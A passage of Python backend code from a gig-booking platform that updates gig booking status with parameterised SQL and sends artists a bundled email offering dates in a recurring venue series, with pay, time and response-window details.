                      AND status IN ('pending_contract','awaiting_venue_contract','pending_venue_approval')
                    LIMIT 1"""),
            {"gid": gig_id}
        ).first()
        new_gig_status = "awaiting_venue_contract" if any_pending else "booked"
        # #9 audit fix: clear hold_status when the gig is fully done
        # so the scheduler stops scanning it + venue banner stops
        # showing it as "still on hold".
        db.execute(
            text("""UPDATE gigs SET status = :s, hold_status = NULL
                    WHERE id = :gid"""),
            {"s": new_gig_status, "gid": gig_id}
        )
    elif requires_contract:
        # Multi-slot, this slot is mid-contract — bump gig.status from
        # 'open' to 'awaiting_venue_contract' so other state machines
        # see the in-flight contract.
        db.execute(
            text("""UPDATE gigs SET status = 'awaiting_venue_contract'
                    WHERE id = :gid AND status = 'open'"""),
            {"gid": gig_id}
        )

    # Build the post-commit action descriptor. The caller fires
    # transactions, emails, and notifications AFTER the whole loop
    # commits — preserving atomicity if a later pick fails.
    post_action = {
        "mode": "contract" if requires_contract else "no_contract",
        "gig_id": gig_id, "slot_id": slot_id,
        "venue_id": gig["venue_id"],
        "pay": float(eff_pay or gig.get("pay") or 0),
        "gig_date": str(gig["date"])[:10] if gig.get("date") else "",
        "start_time": slot.get("start_time") or gig.get("start_time"),
    }
    msg = "Booked pending venue countersign." if requires_contract else "Booked."
    return True, msg, post_action


def _advance_series_bucket_for_artist(db, recurring_group_id: str, artist_id: int):
    """After an artist responds (accept-some / decline-all / expiry),
    find their artist_type and fire the next offer for that bucket
    in the series. Parallel buckets are untouched."""
    from sqlalchemy import text
    artist = db.execute(
        text("SELECT artist_type FROM artists WHERE id = :aid"),
        {"aid": artist_id}
    ).mappings().first()
    if not artist or not artist.get("artist_type"):
        return
    _send_next_series_offer_for_type(db, recurring_group_id, artist["artist_type"])


def _send_series_hold_offer_email(db, recurring_group_id: str, artist_id: int,
                                   token: str, is_reminder: bool = False):
    """Send ONE bundled offer email to an artist with every eligible
    gig in the series listed. Fans out to artist entity_users (mirror
    of the per-gig _send_hold_offer_email).
    """
    from sqlalchemy import text
    artist = db.execute(
        text("""SELECT a.name, u.email FROM artists a
                LEFT JOIN users u ON u.id = a.user_id WHERE a.id = :aid"""),
        {"aid": artist_id}
    ).mappings().first()
    if not artist or not artist.get("email"):
        logger.warning(f"[SERIES_HOLD] no email on file for artist={artist_id}")
        return
    # Eligible gigs (open slots matching this artist)
    eligible = _list_series_eligible_gigs(db, recurring_group_id, artist_id)
    if not eligible:
        # No matching slots in the series — auto-decline + advance bucket.
        logger.warning(
            f"[SERIES_HOLD] rgid={recurring_group_id} artist={artist_id} "
            f"has no eligible gigs — auto-declining + advancing"
        )
        db.execute(
            text("""UPDATE gig_waitlist SET offer_declined = 1
                    WHERE offer_token = :tok"""),
            {"tok": token}
        )
        db.commit()
        _advance_series_bucket_for_artist(db, recurring_group_id, artist_id)
        return
    # Venue + series metadata
    any_gig = eligible[0]
    venue_row = db.execute(
        text("""SELECT v.id, v.venue_name, v.user_id FROM venues v
                JOIN gigs g ON g.venue_id = v.id
                WHERE g.recurring_group_id = :rgid LIMIT 1"""),
        {"rgid": recurring_group_id}
    ).mappings().first()
    venue_name = (venue_row or {}).get("venue_name") or "the venue"
    # Build slot rows HTML
    base_url = "https://gigsfill.com"
    pick_url = f"{base_url}/series-hold/respond/{token}"
    decline_url = f"{base_url}/series-hold/decline/{token}"
    rows_html = ""
    for s in eligible:
        time_str = f"{_fmt_time(s['start_time'])} – {_fmt_time(s['end_time'])}"
        _pay_val = float(s["pay"] or 0)
        _pay_str = f"${int(_pay_val)}" if _pay_val == int(_pay_val) else f"${_pay_val:.2f}"
        if (s.get("deal_type") or "flat").lower() == "door":
            pay_lbl = f"{_pay_str} + {s['door_pct']}% door"
        else:
            pay_lbl = _pay_str
        # Tight rows (Jul 2026): minimal vertical padding + horizontal
        # gap between columns so the table sits compact and the columns
        # don't span full email width. white-space:nowrap keeps cells
        # from wrapping into the next row's lane.
        rows_html += (
            f'<tr><td style="padding:3px 16px 3px 0;font-size:14px;color:#6b7280;white-space:nowrap;">{s["date"]}</td>'
            f'<td style="padding:3px 16px 3px 0;font-size:14px;color:#111827;font-weight:500;white-space:nowrap;">{time_str}</td>'
            f'<td style="padding:3px 0;font-size:14px;color:#059669;font-weight:600;text-align:right;white-space:nowrap;">{pay_lbl}</td></tr>'
        )
    # Venue freq for context line
    freq_days_row = db.execute(
        text("SELECT artist_frequency_days FROM venues WHERE id = :vid"),
        {"vid": (venue_row or {}).get("id")}
    ).mappings().first() if venue_row else None
    freq_days = int((freq_days_row or {}).get("artist_frequency_days") or 0)
    freq_note = (
        f"This venue's frequency rule is {freq_days} days between your bookings — "
        f"the booking page will grey out dates that conflict as you pick."
    ) if freq_days > 0 else "The booking page will grey out dates that conflict as you pick."
    # YELLOW #3 audit: pull venue's actual window setting and interpolate
    # so "24 hours" copy matches reality when the venue customized it.
    _win_hrs = 24
    try:
        _wh = db.execute(
            text("""SELECT MAX(hold_offer_window_hours) as h
                    FROM gigs WHERE recurring_group_id = :rgid"""),
            {"rgid": recurring_group_id}
        ).scalar()
        if _wh: _win_hrs = int(_wh)
    except Exception:
        pass
    if _win_hrs % 24 == 0 and _win_hrs >= 24:
        _win_label = f"{_win_hrs // 24} day{'s' if _win_hrs >= 48 else ''}"
    else:
        _win_label = f"{_win_hrs} hour{'s' if _win_hrs != 1 else ''}"
    vars_dict = {
        "artist_name": artist["name"] or "there",
        "venue_name": venue_name,
        "gig_count": str(len(eligible)),
        "rows_html": rows_html,
        "pick_url": pick_url,
        "decline_url": decline_url,
        "freq_note": freq_note,
        "window_label": _win_label,
    }
    template_key = "hold_series_offer_artist"
    # Fan out to every artist entity user.
    try:
        from backend.utils import get_all_entity_users as _gaeu
        users = _gaeu(db, "artist", artist_id) or []
        emails = sorted({u["email"] for u in users if u.get("email")})
    except Exception:
        emails = []
    if not emails:
        emails = [artist["email"]]
    for to in emails:
        _dispatch_template(db, to_email=to, template_key=template_key, vars=vars_dict)
    # Activity Center notification
    if not is_reminder:
        try:
            _create_artist_notification(
                db, artist_id,
                f"Series offer from {venue_name} — {len(eligible)} dates",
                "Open the Pending Offers banner on the Book Gigs page to pick your dates.",
            )
        except Exception:
            pass
